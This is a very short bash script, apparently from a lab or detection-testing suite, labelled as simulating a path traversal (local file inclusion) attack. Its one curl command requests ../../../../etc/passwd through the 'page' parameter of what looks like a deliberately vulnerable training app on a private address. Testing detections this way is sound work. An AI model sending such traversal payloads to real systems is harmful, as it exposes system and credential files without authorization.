#!/bin/bash
echo "[*] UC03: Simulating Path Traversal (LFI)..."
curl -v "http://172.30.20.10/vulnerabilities/fi/?page=../../../../etc/passwd"      -H "Cookie: security=low; PHPSESSID=test"
